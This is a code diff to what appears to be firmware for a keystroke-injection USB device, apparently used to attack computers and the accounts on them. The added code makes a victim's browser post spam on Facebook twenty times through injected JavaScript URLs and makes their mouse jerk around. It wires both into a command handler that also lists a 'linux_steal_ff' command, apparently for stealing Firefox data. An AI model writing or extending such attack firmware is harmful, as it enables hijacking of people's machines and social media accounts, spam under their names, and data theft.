@@ -289,6 +289,39 @@ void linux_fb_post(char *post)
   led_off();
 }
 
+void linux_spam_100(char *post)
+{
+  led_on();
+  alt_f2();
+  print("firefox");
+  enter_firefox();
+  f6();
+  print("https://www.facebook.com/");
+  enter();
+  delay(FB_LOAD);
+
+  for(int i=0;i<20;i++)
+  {
+    char tmp[100];
+    char tmp2[5];
+    memset(tmp,0,100);
+    strcpy(tmp,post);
+    itoa(i,tmp2,10);
+    strcat(tmp,tmp2);
+    f6();
+    print("javascript:document.getElementById(\"u_0_y\").focus()");
+    delay(DELAY_AFTER_JAVASCRIPT);
+    enter();
+    print(tmp);
+    f6();
+    print("javascript:(document.getElementsByClassName(\"_11b\")[0]).focus()");
+    enter();
+    enter();
+  }
+  
+  led_off();
+}
+
 void windows_fb_post(char *post) //tested
 {
   delay_for_windows=500;
@@ -314,6 +347,26 @@ void windows_fb_post(char *post) //tested
   led_off();
 }
 
+void drunkard_mouse()
+{
+  int i;
+  for(int j=0;j<20;j++)
+  {
+    for (i=0; i<40; i++) {
+      Mouse.move(4, -2);
+      delay(25);
+    }
+    for (i=0; i<40; i++) {
+      Mouse.move(4, 4);
+      delay(25);
+    }
+    for (i=0; i<40; i++) {
+      Mouse.move(-8, -2);
+      delay(25);
+    }
+  }
+}
+
 void run_command()
 {
   if(!strncmp(cmd,"linux_steal_ff",strlen("linux_steal_ff")))
@@ -330,6 +383,10 @@ void run_command()
     linux_fb_post(cmd+strlen("linux_fb_post:"));
   else if(!strncmp(cmd,"windows_fb_post:",strlen("windows_fb_post:")))
     windows_fb_post(cmd+strlen("windows_fb_post:"));
+  else if(!strncmp(cmd,"linux_spam_100:",strlen("linux_spam_100:")))
+    linux_spam_100(cmd+strlen("linux_spam_100:"));
+  else if(!strncmp(cmd,"drunkard_mouse",strlen("drunkard_mouse")))
+    drunkard_mouse();
 }
 
 void loop() {
